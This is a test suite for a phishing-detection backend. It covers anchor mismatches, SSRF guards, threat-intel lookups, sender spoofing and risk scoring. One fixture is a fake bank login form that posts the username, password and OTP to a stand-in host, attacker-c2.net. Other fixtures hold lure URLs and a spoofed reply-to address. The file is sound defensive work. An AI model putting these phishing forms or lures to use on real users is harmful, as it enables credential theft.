"""
Comprehensive Tests for Dynamic Evidence Generation System.

Validates:
1. Indicator Extraction (URLs, domains, IPs, SMS headers, anchor mismatches).
2. Domain Intelligence (DNS, TLS, RDAP/WHOIS).
3. Threat Intel Providers (URLhaus, PhishStats, PhishTank, SafeBrowsing, VirusTotal).
4. Safe Website Behavior & DOM Analyzer (SSRF protection, credential forms, cross-domain POST).
5. Sender Security Analyzer (TRAI DLT, personal mobile bank impersonation, email spoofing).
6. Evidence Store (SQLite persistence and TTL cache).
7. End-to-End Dynamic Analysis Pipeline without fabricated evidence.
"""

import asyncio
from unittest.mock import MagicMock, patch

from backend.models.evidence import (
    EvidenceItem,
    EvidenceSeverity,
    EvidenceStatus,
    EvidenceType,
    IncidentEvidence,
    InputType,
    RiskDirection,
    RiskLevel,
    ThreatIntelResult,
    ThreatIntelStatus,
    UserCategory,
)
from backend.services.indicators import extract_indicators
from backend.services.domain_intel import (
    clean_domain,
    collect_domain_evidence,
    is_safe_ip,
    resolve_dns,
)
from backend.services.threat_intel_providers import (
    ThreatIntelManager,
    URLhausProvider,
    VirusTotalProvider,
)
from backend.services.website_analyzer import inspect_website
from backend.services.sender_analyzer import analyze_sms_sender, analyze_email_sender
from backend.services.evidence_store import (
    init_db,
    save_investigation,
    get_cached_indicator,
    set_cached_indicator,
)
from backend.modules.fusion import fuse_evidence


# ─── 1. Indicator Extraction Tests ───

def test_extract_indicators_deceptive_anchor():
    html_text = 'Please verify your account here: <a href="http://evil-phish.com/sbi">https://onlinesbi.sbi</a> immediately.'
    result = extract_indicators(html_text)

    assert len(result.anchor_mismatches) == 1
    mismatch = result.anchor_mismatches[0]
    assert mismatch["display_text"] == "https://onlinesbi.sbi"
    assert "evil-phish.com" in mismatch["actual_destination"]
    assert "State Bank of India" in result.mentioned_brands


def test_extract_indicators_sms_and_phone():
    text = "Dear customer, your SBI account is blocked. Call +91 9876543210 or visit http://sbi-kyc-update.com"
    result = extract_indicators(text)

    assert any("9876543210" in p for p in result.phone_numbers)
    assert any("sbi-kyc-update.com" in u.original for u in result.urls)
    assert "blocked" in result.urgency_keywords
    assert "kyc" in result.credential_keywords


# ─── 2. Domain Intelligence Tests ───

def test_is_safe_ip_ssrf_guards():
    assert not is_safe_ip("127.0.0.1")
    assert not is_safe_ip("10.0.0.1")
    assert not is_safe_ip("172.16.0.5")
    assert not is_safe_ip("192.168.1.1")
    assert not is_safe_ip("169.254.169.254")
    assert not is_safe_ip("::1")
    assert not is_safe_ip("not-an-ip")

    assert is_safe_ip("8.8.8.8")
    assert is_safe_ip("1.1.1.1")


def test_clean_domain_normalization():
    assert clean_domain("https://example.com/login?u=1") == "example.com"
    assert clean_domain("http://sub.domain.org:8080/path") == "sub.domain.org"
    assert clean_domain("EXAMPLE.COM") == "example.com"


def test_collect_domain_evidence_non_existent():
    items = collect_domain_evidence("this-definitely-does-not-exist-12345xyz.org")
    assert any(item.type == EvidenceType.DNS_RECORD for item in items)


# ─── 3. Threat Intel Providers Tests ───

def test_virustotal_unconfigured_never_invents_evidence():
    async def _run():
        with patch("backend.services.threat_intel_providers.get_settings") as mock_settings:
            mock_settings.return_value.virustotal_api_key = None
            vt = VirusTotalProvider()
            assert not vt.is_available
            res = await vt.check_url("http://unknown-target.com")
            assert res.intel_status == ThreatIntelStatus.SOURCE_UNAVAILABLE
            assert "API key not configured" in (res.error or "")
    asyncio.run(_run())


def test_urlhaus_live_or_mock_result():
    async def _run():
        provider = URLhausProvider()
        assert provider.is_available
        with patch("httpx.AsyncClient.post") as mock_post:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.json.return_value = {
                "query_status": "ok",
                "url_status": "online",
                "threat": "malware_download",
                "tags": ["agenttesla", "exe"],
            }
            mock_post.return_value = mock_resp

            res = await provider.check_url("http://malware-drop.com/payload.exe")
            assert res.intel_status == ThreatIntelStatus.KNOWN_MALICIOUS
            assert "malware_download" in res.details
    asyncio.run(_run())


# ─── 4. Safe Website Behavior & DOM Analyzer Tests ───

def test_inspect_website_ssrf_blocked():
    async def _run():
        analysis, items = await inspect_website("http://127.0.0.1:8000/admin")
        assert "SSRF" in (analysis.get("error") or "")
        assert len(items) == 0
    asyncio.run(_run())


def test_inspect_website_detects_credential_form_and_cross_domain_post():
    async def _run():
        html_content = b"""
        <html>
            <head><title>State Bank of India - Login Portal</title></head>
            <body>
                <h2>Enter NetBanking Credentials</h2>
                <form action="http://attacker-c2.net/steal.php" method="POST">
                    <input type="text" name="username" placeholder="User ID">
                    <input type="password" name="password" placeholder="Password">
                    <input type="text" name="otp" placeholder="Enter OTP">
                    <button type="submit">Login</button>
                </form>
            </body>
        </html>
        """

        async def fake_stream():
            yield html_content

        with patch("httpx.AsyncClient.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.url = "http://fake-sbi-portal.xyz/login"
            mock_resp.is_redirect = False
            mock_resp.aiter_bytes = fake_stream
            mock_get.return_value = mock_resp

            analysis, items = await inspect_website("http://fake-sbi-portal.xyz/login")

            assert analysis["title"] == "State Bank of India - Login Portal"
            assert analysis["has_password_field"] is True
            assert "otp" in analysis["credential_fields"]
            assert len(analysis["cross_domain_forms"]) == 1

            assert any(item.type == EvidenceType.WEBSITE_BEHAVIOR and "credential entry form" in item.finding.lower() for item in items)
            assert any(item.type == EvidenceType.WEBSITE_BEHAVIOR and ("cross-domain" in item.finding.lower() or "external" in item.finding.lower()) for item in items)
    asyncio.run(_run())


# ─── 5. Sender Security Analyzer Tests ───

def test_analyze_sms_sender_personal_mobile_bank_impersonation():
    analysis, items = analyze_sms_sender("+91 9876543210", "Your SBI bank account has been locked. Update KYC immediately.")
    assert analysis["is_personal_mobile"] is True
    assert analysis["claimed_entity"] == "State Bank of India"
    assert len(items) == 1
    assert items[0].severity == EvidenceSeverity.HIGH
    assert "personal 10-digit mobile number" in items[0].finding


def test_analyze_sms_sender_trai_dlt_compliant():
    analysis, items = analyze_sms_sender("VK-SBIINB", "Your OTP for SBI Netbanking login is 482910.")
    assert analysis["is_dlt_compliant"] is True
    assert any("TRAI DLT" in item.finding for item in items)


def test_analyze_email_sender_display_name_spoofing():
    analysis, items = analyze_email_sender(
        from_header='"State Bank of India Support" <urgent-alert@freemail-service.com>',
        reply_to_header='<hacker-drop@gmail.com>',
        auth_results='spf=fail (sender IP not authorized)',
    )
    assert analysis["display_name_spoof"] is True
    assert analysis["reply_to_mismatch"] is True
    assert any("display name claims" in item.finding.lower() for item in items)
    assert any("reply-to destination mismatch" in item.finding.lower() for item in items)
    assert any("spf authentication" in item.finding.lower() for item in items)


# ─── 6. Evidence Store Tests ───

def test_evidence_store_ttl_cache_and_persistence():
    init_db()

    # Test indicator cache
    set_cached_indicator("test-phish-domain.com", "whois", {"days_old": 2, "registrar": "NameCheap"}, ttl_seconds=60)
    cached = get_cached_indicator("test-phish-domain.com", "whois")
    assert cached is not None
    assert cached["days_old"] == 2

    # Test incident persistence
    incident = IncidentEvidence(
        input_type=InputType.URL,
        message="http://test-phish-domain.com",
    )
    incident.evidence.append(EvidenceItem(
        type=EvidenceType.DOMAIN_AGE,
        source="whois",
        evidence_tier="OBSERVED",
        finding="Domain registered 2 days ago",
        description="Freshly registered domain",
        status=EvidenceStatus.CONFIRMED,
    ))

    success = save_investigation(incident)
    assert success is True


# ─── 7. Fusion Engine Overrides Test ───

def test_fusion_engine_credential_exfiltration_override():
    incident = IncidentEvidence(
        input_type=InputType.URL,
        message="http://fake-bank-login.xyz",
    )
    incident.evidence.append(EvidenceItem(
        type=EvidenceType.WEBSITE_BEHAVIOR,
        source="website_analyzer",
        evidence_tier="OBSERVED",
        finding="Form submits entered data to external 3rd-party host",
        description="Cross-domain credential form exfiltration",
        status=EvidenceStatus.CONFIRMED,
        severity=EvidenceSeverity.CRITICAL,
        risk_direction=RiskDirection.INCREASES_RISK,
    ))

    fused = fuse_evidence(incident)
    assert fused.risk.level == RiskLevel.CRITICAL
    assert fused.risk.score >= 0.90
    assert any("credential exfiltration form" in factor.lower() for factor in fused.risk.contributing_factors)
